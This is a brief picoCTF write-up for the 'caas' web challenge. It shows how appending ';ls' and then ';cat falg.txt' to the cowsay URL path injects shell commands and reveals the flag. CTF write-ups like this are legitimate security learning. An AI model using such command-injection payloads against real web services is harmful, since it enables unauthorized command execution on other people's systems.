# CTF-Documentation
# CTF Name : pico ctf
# Category : web exploitation
# Challenge Name : caas
# find flag
<img width="1599" height="779" alt="1" src="https://github.com/user-attachments/assets/29350f6f-462c-4058-b24b-222210d26a47" />
the wibsite said Make a request to the following URL to cowsay your message:
https://caas.mars.cylabacademy.net/cowsay/{message}
and will do 
      
    https://caas.mars.cylabacademy.net/cowsay/hello
and we get this cow over her 
<img width="1598" height="820" alt="2h" src="https://github.com/user-attachments/assets/b821b50f-e424-46fc-b3c0-b1f7d1ac1552" />
and after see index.js we can execute os command and will do this linux command ls to see files by this url
 
    https://caas.mars.cylabacademy.net/cowsay/hello;ls
and we get this 
<img width="1599" height="824" alt="3h" src="https://github.com/user-attachments/assets/930a2086-c270-4c16-928f-7ab11c1d2533" />
as we see falg.txt and will do this url to read file falg.txt

    https://caas.mars.cylabacademy.net/cowsay/hello;cat falg.txt

  <img width="1599" height="828" alt="4" src="https://github.com/user-attachments/assets/4cf11395-36a2-4e6f-9e52-48acecd63a5d" />\
  get flag! The strangest flag I've ever seen





